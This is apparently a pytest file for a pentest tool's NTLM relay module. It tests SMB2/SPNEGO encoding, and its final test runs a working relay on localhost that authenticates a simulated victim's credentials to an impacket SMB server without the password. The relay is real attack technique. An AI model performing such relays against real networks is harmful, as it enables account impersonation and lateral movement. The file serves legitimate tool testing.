"""NTLM relay: the SMB2/SPNEGO codec, and a real end-to-end relay.

The codec tests are pure NetLab round-trips. The end-to-end test is the real
thing: it stands up an actual impacket SMB2 server as the target, drives an
actual impacket SMB client as the victim, and checks that NetLab's relay
authenticates the victim's credentials to the target without ever holding the
password. It is skipped where impacket is not installed.
"""

from __future__ import annotations

import socket
import threading
import time

import pytest

from netlab.analyze import credfmt as fmt
from netlab.intercept import ntlm_relay as R


# ------------------------------------------------------------------ codec

def test_der_length_encoding():
    assert R._der_len(0) == b"\x00"
    assert R._der_len(127) == b"\x7f"
    assert R._der_len(128) == b"\x81\x80"
    assert R._der_len(256) == b"\x82\x01\x00"


def test_spnego_initial_wrap_then_extract():
    ntlmssp = fmt.NTLMSSP_SIGNATURE + b"\x01\x00\x00\x00" + b"payload-type-1"
    token = R.spnego_wrap_initial(ntlmssp)
    assert token[0] == 0x60                       # [APPLICATION 0]
    assert R.OID_SPNEGO in token and R.OID_NTLMSSP in token
    assert R.spnego_extract_ntlmssp(token) == ntlmssp


def test_spnego_response_wrap_then_extract():
    ntlmssp = fmt.NTLMSSP_SIGNATURE + b"\x02\x00\x00\x00" + b"challenge-blob"
    token = R.spnego_wrap_response(ntlmssp)
    assert token[0] == 0xA1                        # [1] NegTokenResp
    assert R.spnego_extract_ntlmssp(token) == ntlmssp


def test_spnego_extract_handles_raw_ntlmssp():
    raw = fmt.NTLMSSP_SIGNATURE + b"\x03\x00\x00\x00" + b"auth"
    assert R.spnego_extract_ntlmssp(raw) == raw


def test_smb2_header_roundtrip():
    hdr = R.smb2_header(R.SMB2_SESSION_SETUP, message_id=42, session_id=0xABCD)
    parsed = R.smb2_parse_header(hdr + b"the-body")
    assert parsed["command"] == R.SMB2_SESSION_SETUP
    assert parsed["message_id"] == 42
    assert parsed["session_id"] == 0xABCD
    assert parsed["body"] == b"the-body"


def test_smb2_parse_rejects_non_smb2():
    assert R.smb2_parse_header(b"\x00" * 64) is None
    assert R.smb2_parse_header(b"short") is None


def test_negotiate_request_roundtrip():
    hdr = R.smb2_parse_header(R.build_negotiate_request())
    assert hdr["command"] == R.SMB2_NEGOTIATE
    neg = R.parse_negotiate_request(hdr["body"])
    assert R.SMB2_DIALECT_0210 in neg["dialects"]


def test_negotiate_response_roundtrip():
    resp = R.build_negotiate_response(R.SMB2_DIALECT_0210, b"SERVERGUID_16by")
    hdr = R.smb2_parse_header(resp)
    parsed = R.parse_negotiate_response(hdr["body"])
    assert parsed["dialect"] == R.SMB2_DIALECT_0210
    # the advertised security blob must carry the NTLMSSP OID
    assert R.OID_NTLMSSP in parsed["security"]


def test_session_setup_request_carries_the_security_buffer():
    blob = R.spnego_wrap_initial(fmt.NTLMSSP_SIGNATURE + b"\x01\x00\x00\x00X")
    msg = R.build_session_setup_request(blob, message_id=1)
    hdr = R.smb2_parse_header(msg)
    assert hdr["command"] == R.SMB2_SESSION_SETUP
    assert R.parse_session_setup_request(hdr["body"]) == blob


def test_session_setup_response_carries_status_and_buffer():
    blob = R.spnego_wrap_response(fmt.NTLMSSP_SIGNATURE + b"\x02\x00\x00\x00Y")
    msg = R.build_session_setup_response(
        R.STATUS_MORE_PROCESSING_REQUIRED, blob, session_id=7, message_id=1)
    hdr = R.smb2_parse_header(msg)
    assert hdr["status"] == R.STATUS_MORE_PROCESSING_REQUIRED
    assert hdr["session_id"] == 7
    assert R.parse_session_setup_response(hdr) == blob


def test_relay_server_refuses_out_of_scope_target():
    class Scope:
        def contains(self, ip):
            return ip == "10.0.0.5"
    srv = R.RelayServer(target_host="10.0.0.9", scope=Scope())
    with pytest.raises(R.RelayError):
        srv.start()


# ------------------------------------------------------ real end-to-end relay

impacket = pytest.importorskip("impacket", reason="impacket not installed")
from impacket.smbserver import SimpleSMBServer          # noqa: E402
from impacket.smbconnection import SMBConnection        # noqa: E402
from impacket.smb3structs import SMB2_DIALECT_21        # noqa: E402
from impacket.ntlm import compute_nthash                # noqa: E402


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _wait_port(port: int, timeout: float = 5.0) -> bool:
    end = time.time() + timeout
    while time.time() < end:
        try:
            socket.create_connection(("127.0.0.1", port), 0.3).close()
            return True
        except OSError:
            time.sleep(0.1)
    return False


def test_ntlm_relay_authenticates_a_victim_to_a_real_smb_target():
    import logging
    logging.disable(logging.CRITICAL)
    user, password = "relayuser", "R3layM3!"
    target_port = _free_port()

    server = SimpleSMBServer(listenAddress="127.0.0.1", listenPort=target_port)
    server.setSMB2Support(True)
    server.addCredential(user, 0, "", compute_nthash(password).hex())
    threading.Thread(target=server.start, daemon=True).start()
    assert _wait_port(target_port), "impacket target server did not start"

    relay = R.RelayServer(target_host="127.0.0.1", target_port=target_port,
                          listen_host="127.0.0.1", listen_port=0)
    relay.start()
    try:
        assert _wait_port(relay.listen_port), "relay did not start"
        # The victim believes it is logging into a file server; NetLab relays.
        conn = SMBConnection("FILESERVER", "127.0.0.1",
                             sess_port=relay.listen_port,
                             preferredDialect=SMB2_DIALECT_21, timeout=8)
        with pytest.raises(Exception):
            # The victim is never actually logged in — it gets a failure back,
            # because the authentication was spent on the target instead.
            conn.login(user, password)

        deadline = time.time() + 3
        while not relay.results and time.time() < deadline:
            time.sleep(0.1)
        assert relay.results, "relay produced no result"
        r = relay.results[0]
        assert r["success"] is True
        assert r["user"] == user
        assert r["target"].endswith(":%d" % target_port)
    finally:
        relay.stop()
